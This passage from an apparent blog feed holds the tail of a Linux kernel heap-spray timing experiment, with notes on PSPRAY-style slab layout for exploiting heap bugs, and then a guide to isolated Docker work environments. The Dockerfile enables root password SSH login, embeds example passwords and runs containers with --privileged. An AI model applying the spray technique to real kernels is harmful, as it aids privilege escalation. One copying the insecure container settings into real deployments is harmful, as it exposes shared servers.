class="hljs-number">0x1000</span>; i++) &#123;<br>        msqid[i] = get_msg_queue();<br>        <span class="hljs-keyword">if</span> (msqid[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to get msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span>*) buf = <span class="hljs-number">123456</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> begin, end;<br><br>        begin = rdtsc();<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to alloc msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        end = rdtsc();<br><br>        exec_time[i] = end - begin;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (del_msg_queue(msqid[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果其实还是挺明显的，不过需要注意的是主流发行版的 <code>kmalloc-512</code> 的 slab 大小和我们平时打CTF 用的内核的不一定一样</p><blockquote><p> 笔者真机环境这个是 <code>16</code> 个 512 对象一张 slab，CTF 环境通常是 <code>8</code> 个512 对象一张 slab</p></blockquote><p><img src="https://s2.loli.net/2023/09/16/ZtAB2MvgWib8Qhf.png" alt="image.png"></p><p>不过在笔者看来<strong>我们其实并没有必要使用 PSPRAY 方法进行利用，即没有必要手动获取分配新的 slab 页面的时间</strong>，还是以 OOB 堆喷为例，当堆喷到一定数量级的时候其实都会向 buddy system 请求新的页面，那我们可以简单拆为如下四段式利用：</p><ul><li>首先堆喷大量同大小对象耗空 partial slab，迫使 SLUB 请求新页</li><li>堆喷目标对象，让 SLUB 再取新页</li><li>分配漏洞对象</li><li>堆喷目标对象，让 SLUB 再取新页</li></ul><p>这种方法<strong>本质上与 PSPRAY 所达成的效果一致，因为实质上我们并不需要判断新 slab 页面的分配时间，只需要达成使用目标对象将漏洞对象包裹的效果即可</strong>，这也是笔者所常用的利用技巧之一 ：）</p><blockquote><p>参见笔者出的一道 CTF 题目：<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 - d3kcache</a>，里面便使用了这种方法进行辅助</p></blockquote><p>不过无论如何，$PSPRAY$ 论文的作者确乎向我们展示了一种<strong>非常有趣且实用的漏洞利用技巧</strong>，让笔者受益匪浅</p><blockquote><p><del>希望笔者有一天也能像这群大佬那样发一堆顶会</del></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;🎵THIS IS MY KINGDOM C*M🎵&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x00】使用 Docker 创建隔离的工作环境</title>
    <link href="https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/"/>
    <id>https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/</id>
    <published>2023-08-31T11:55:24.000Z</published>
    <updated>2023-09-26T16:09:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>怎么实验室只有👴一个运维</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>因为笔者目前所在的实验室好像只有笔者一个人会一点点运维技术，<del>大家都喜欢在根目录和各种乱七八糟的目录到处乱拉</del>（错乱），为了保证服务器环境不会哪天用着用着给整个挂掉了，笔者写了一份《服务器安全使用指北》，并顺便拷贝过来水一篇博客（笑）</p></blockquote><h2 id="What-is-docker"><a href="#What-is-docker" class="headerlink" title="What is docker?"></a>What is docker?</h2><blockquote><p>抄自 Wikipedia：</p><p><a href="https://www.docker.com/">Docker</a> 是一个开源的开放平台软件，用于开发应用、交付（shipping）应用和运行应用。Docker 允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度。</p></blockquote><p>按照笔者的理解，Docker 可以简单理解为用于创建<strong>共享操作系统内核虚拟机隔离环境</strong>（称为容器）的工具包：</p><p><img src="https://s2.loli.net/2023/08/31/MYFEIkeyz5iR9t4.png"></p><h2 id="Why-use-docker"><a href="#Why-use-docker" class="headerlink" title="Why use docker?"></a>Why use docker?</h2><p>为了解决服务器环境污染问题（例如配环境把服务器主环境搞崩了，这将同时影响到使用服务器的多个用户），在服务器多人共享的情况下，对于<strong>不涉及内核驱动更改的工作</strong>，推荐使用 docker 创建一个新的隔离环境来完成。</p><h2 id="How-to-install-docker"><a href="#How-to-install-docker" class="headerlink" title="How to install docker?"></a>How to install docker?</h2><blockquote><p><strong>推荐参照官网的安装教程来完成，这里笔者也是使用的官网教程进行安装</strong></p><p>笔者实验室服务器安装了 Ubuntu，其他发行版请参见<a href="https://docs.docker.com/engine/install/ubuntu/">官网教程</a>进行安装</p></blockquote><h3 id="Docker-Engine（推荐）"><a href="#Docker-Engine（推荐）" class="headerlink" title="Docker Engine（推荐）"></a>Docker Engine（推荐）</h3><p>首先通过如下命令卸载可能存在的旧版 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> docker.io docker-doc docker-compose podman-docker containerd runc; <span class="hljs-keyword">do</span> sudo apt-get remove <span class="hljs-variable">$pkg</span>; <span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>接下来添加 docker 仓库的 GPG key 并进行配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>正式安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></code></pre></td></tr></table></figure><p>完成之后可以通过如下命令验证是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run hello-world</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="Docker-Desktop（不推荐）"><a href="#Docker-Desktop（不推荐）" class="headerlink" title="Docker Desktop（不推荐）"></a><em>Docker Desktop（不推荐）</em></h3><blockquote><p> Docker Desktop 额外提供了一个 GUI，以及不同用户间的隔离机制，不过 <em>笔者用着感觉不是很 ok</em> ，所以还是推荐传统的纯 Docker Engine</p></blockquote><p>对于非 Gnome 桌面环境而言，需要安装 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install gnome-terminal</span><br></code></pre></td></tr></table></figure><p>卸载可能安装过的 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt remove docker-desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/.docker/desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt purge docker-desktop</span><br></code></pre></td></tr></table></figure><p>设置 docker 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>下载 docker 安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://desktop.docker.com/linux/main/amd64/docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ./docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>启动 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user start docker-desktop</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user restart docker-desktop</span><br></code></pre></td></tr></table></figure><h1 id="0x01-使用-docker-搭建基本的容器环境"><a href="#0x01-使用-docker-搭建基本的容器环境" class="headerlink" title="0x01. 使用 docker 搭建基本的容器环境"></a>0x01. 使用 docker 搭建基本的容器环境</h1><p><strong>若用户未加入 docker 用户组则所有命令开头都需要添加</strong> <strong>sudo</strong> <strong>获得 root 权限</strong></p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>首先在一个空白的文件夹中创建一个名为 <code>Dockerfile</code> 的文件，写入如下内容：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># 可以在这里预先添加想要安装的软件</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim netcat openssh-server unzip make wget bison flex build-essential curl</span><br><br><span class="hljs-comment"># 开启ssh登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 设置允许密码登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 添加用户密码，这里只是一个示例，根据你的需求自己修改</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:lTaa4cqucW4zxvJswU5KH0HIRM9VmjO7&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:rqUHmfGUtjItWapDuv3NEqwQ9bm6GBrs&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># 添加 ssh 登录，注意换成自己新建的用户的用户名</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># 保持 docker 容器运行</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>接下来运行以下命令创建镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t <span class="hljs-string">&quot;自定义镜像名&quot;</span> .</span><br></code></pre></td></tr></table></figure><h2 id="创建并启动-docker-容器"><a href="#创建并启动-docker-容器" class="headerlink" title="创建并启动 docker 容器"></a>创建并启动 <strong>docker 容器</strong></h2><p>完成 docker 镜像创建之后接下来我们就可以开始使用该镜像启动一个新的容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure><p>这里添加了一个服务器端口到容器内部 <code>22</code> 端口的映射，从而使得可以从外部直接通过 ssh 连接到容器内部</p><p>如果你的容器不需要主机相关的一些权限，也可以去掉 <code>--privileged</code> 参数</p><h2 id="进入-docker-容器"><a href="#进入-docker-容器" class="headerlink" title="进入 docker 容器"></a>进入 docker 容器</h2><p>进入容器环境有两种办法，一种是通过 container id（可以通过 <code>docker ps</code> 查看，在创建容器时也会打印出容器id），另一种是通过自定义的容器名，这里进入容器后默认是 root 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><p>如果想要以容器内部的指定用户身份进入容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -u 用户名 -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="从外部连接-docker-容器"><a href="#从外部连接-docker-容器" class="headerlink" title="从外部连接 docker 容器"></a>从外部连接 docker 容器</h2><p>在启动容器时我们已经指定了一个外部端口映射，可以直接通过该端口进行 ssh 连接，操作和正常登录服务器基本一致，不过要手动指定该外部端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh 容器内用户名@服务器主机名或IP -p 自定义的外部端口</span><br></code></pre></td></tr></table></figure><h2 id="删除-docker-容器"><a href="#删除-docker-容器" class="headerlink" title="删除 docker 容器"></a><strong>删除 docker 容器</strong></h2><p>如果 docker 内环境配崩了不想要了，可以简单通过如下命令将该容器进行删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker stop 容器ID或容器名</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">rm</span> 容器ID或容器名</span><br></code></pre></td></tr></table></figure><p>重新创建新的容器环境可以直接回到第二步继续进行</p><h2 id="删除-docker-镜像"><a href="#删除-docker-镜像" class="headerlink" title="删除 docker 镜像"></a>删除 docker 镜像</h2><p>如果 docker 镜像构建感觉不够好，可以通过如下命令删除对应镜像（需确保没有容器在使用该镜像）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker rmi 镜像名</span><br></code></pre></td></tr></table></figure><p>后续使用则需要回到第一步从头开始</p><h1 id="0x02-创建可以使用显卡的-docker-环境"><a href="#0x02-创建可以使用显卡的-docker-环境" class="headerlink" title="0x02. 创建可以使用显卡的 docker 环境"></a>0x02. 创建可以使用显卡的 docker 环境</h1><p>有的时候会存在需要在显卡上跑一些任务的需求，本节讲述如何创建一个挂载了显卡的 docker 容器</p><h2 id="What-is-NVIDIA-Container-Toolkit"><a href="#What-is-NVIDIA-Container-Toolkit" class="headerlink" title="What is NVIDIA Container Toolkit ?"></a>What is <code>NVIDIA Container Toolkit</code> ?</h2><p><a href="https://github.com/NVIDIA/nvidia-container-toolkit">NVIDIA Container Toolkit</a> 是由英伟达开发的一套对 docker 进行包装的工具，从而使得 docker 容器可以使用服务器主机上的显卡</p><p><img src="https://s2.loli.net/2023/08/31/dWpAu8LJQ2bOShg.png" alt="image.png"></p><h2 id="安装-NVIDIA-Container-Toolk"><a href="#安装-NVIDIA-Container-Toolk" class="headerlink" title="安装 NVIDIA Container Toolk"></a>安装 NVIDIA Container Toolk</h2><p>有两种方法：</p><h4 id="方法-①"><a href="#方法-①" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>需要在服务器主机上完成，首先使用如下命令安装基本组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update \</span><br><span class="language-bash">    &amp;&amp; sudo apt-get install -y nvidia-container-toolkit-base</span><br></code></pre></td></tr></table></figure><p>使用如下命令检查是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nvidia-ctk --version</span><br></code></pre></td></tr></table></figure><p>接下来使用如下命令生成 CDI （Container Device Interface）规范文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml</span><br></code></pre></td></tr></table></figure><p>添加 NVIDIA 仓库与 GPG 密钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>) \</span><br><span class="language-bash">      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \</span><br><span class="language-bash">      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/<span class="hljs-variable">$distribution</span>/libnvidia-container.list | \</span><br><span class="language-bash">            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \</span><br><span class="language-bash">            sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list</span><br></code></pre></td></tr></table></figure><p>安装 toolkit：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure><p>配置 docker daemon 进程以识别 NVIDIA COntainer Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>测试是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run --<span class="hljs-built_in">rm</span> --runtime=nvidia --gpus all nvidia/cuda:11.6.2-base-ubuntu20.04 nvidia-smi</span><br></code></pre></td></tr></table></figure><p>最后成功输出和 <code>nvidia-smi</code> 